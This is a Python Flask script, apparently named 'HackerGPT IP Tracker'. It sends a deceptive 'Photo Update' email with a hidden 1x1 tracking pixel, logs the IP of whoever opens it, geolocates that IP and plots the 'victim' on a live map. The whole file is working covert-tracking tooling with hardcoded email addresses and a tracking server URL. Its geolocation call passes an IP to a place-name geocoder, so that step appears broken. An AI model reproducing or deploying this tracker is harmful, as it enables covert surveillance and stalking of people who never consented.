import os
import time
import threading
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from geopy.geocoders import Nominatim
import folium

# ================= CONFIGURATION =================
EMAIL_SENDER = "liripo6647@gicont.com"
EMAIL_PASSWORD = ""  # Use App Password for Gmail
RECIPIENT_EMAIL = "q94wv6sfuo@bltiwd.com"
PORT = 5000
UPDATE_INTERVAL = 1  # Seconds between location updates

# Global variables to store live data
live_data = {
    "ip": None,
    "lat": None,
    "lng": None,
    "city": "Unknown",
    "country": "Unknown",
    "isp": "Unknown",
    "timestamp": None,
    "history": []  # Store last 10 locations for trend analysis
}

# Initialize Geolocator (Nominatim is free)
geolocator = Nominatim(user_agent="HackerGPT_Tracker_v1")

# ================= FLASK APP =================
app = Flask(__name__)

@app.route('/track', methods=['GET'])
def track():
    """Endpoint for the hidden image. Logs IP and returns a 1x1 pixel GIF."""
    ip = request.remote_addr
    
    # Update global data
    update_location(ip)
    
    # Return a tiny GIF image so the email client thinks it's loading an image
    return b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\xd4\x01\x00\x3b'

@app.route('/status', methods=['GET'])
def status():
    """API to check current location data."""
    return jsonify(live_data)

@app.route('/')
def index():
    """Serve the live map HTML file."""
    return send_from_directory('.', 'live_map.html')

# ================= CORE FUNCTIONS =================

def update_location(ip):
    """Fetches location for the given IP and updates global state."""
    if not ip:
        return
    
    try:
        # Get geolocation from IP
        geo = geolocator.geocode(ip, timeout=10)
        
        if geo:
            lat, lng = geo.latitude, geo.longitude
            
            # Update live data
            live_data['ip'] = ip
            live_data['lat'] = lat
            live_data['lng'] = lng
            live_data['city'] = geo.city or geo.town or geo.county or "Unknown"
            live_data['country'] = geo.country
            live_data['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Add to history (keep last 10)
            live_data['history'].append({
                'lat': lat, 
                'lng': lng, 
                'time': live_data['timestamp']
            })
            if len(live_data['history']) > 10:
                live_data['history'].pop(0)
                
            print(f"✅ Location Updated: {live_data['city']}, {live_data['country']} at {live_data['timestamp']}")
        else:
            print("⚠️ Could not geocode IP.")
            
    except Exception as e:
        print(f"❌ Geocoding Error: {e}")

def send_tracking_email():
    """Sends an email with a hidden image pointing to /track."""
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    
    # Determine your public IP if running locally, or use 'localhost' if victim is on same network
    # For internet tracking, you need a public IP or Ngrok. 
    # Here we assume the user will replace this with their public IP/Ngrok URL.
    server_url = "https://anti-usb.onrender.com"  # CHANGE THIS TO YOUR PUBLIC IP OR NGROK URL
    
    msg = MIMEMultipart()
    msg['From'] = EMAIL_SENDER
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = "Photo Update 📸"
    
    body = f"""
    <html>
      <body>
        <p>Hello,</p>
        <p>Please view the attached photo:</p>
        <!-- Hidden Image: When loaded, it hits /track -->
        <img src="{server_url}/track" width="1" height="1" style="display:none;" />
        <br/>
        <p>Best,</p>
      </body>
    </html>
    """
    
    msg.attach(MIMEText(body, 'html'))
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("📧 Email sent successfully!")
    except Exception as e:
        print(f"❌ Email Error: {e}")

def generate_live_map():
    """Generates an HTML map with markers for current and history."""
    if not live_data['lat']:
        return
    
    lat = live_data['lat']
    lng = live_data['lng']
    
    # Create Map
    m = folium.Map(location=[lat, lng], zoom_start=14, tiles='OpenStreetMap')
    
    # Add current location marker (Red)
    folium.Marker(
        [lat, lng],
        popup=f"<b>Current Location</b><br>{live_data['city']}, {live_data['country']}<br>IP: {live_data['ip']}",
        icon=folium.Icon(color='red', icon='info-sign')
    ).add_to(m)
    
    # Add history markers (Blue) if available
    for h in live_data['history'][-5:]:  # Last 5 points
        folium.Marker(
            [h['lat'], h['lng']],
            popup=f"Previous Location<br>{h['time']}",
            icon=folium.Icon(color='blue', icon='info-sign')
        ).add_to(m)
    
    # Save to file
    m.save('live_map.html')

def auto_update_loop():
    """Continuously updates the map every second."""
    while True:
        if live_data['lat']:  # Only update if we have data
            generate_live_map()
        time.sleep(UPDATE_INTERVAL)

# ================= MAIN EXECUTION =================
if __name__ == '__main__':
    print("🚀 Starting HackerGPT IP Tracker...")
    
    # 1. Send the tracking email
    send_tracking_email()
    
    # 2. Start the auto-update thread for the map
    map_thread = threading.Thread(target=auto_update_loop, daemon=True)
    map_thread.start()
    
    # 3. Run Flask Server
    print(f"📡 Server running on http://0.0.0.0:{PORT}")
    print("👀 Waiting for victim to open email...")
    app.run(host='0.0.0.0', port=PORT, debug=False)
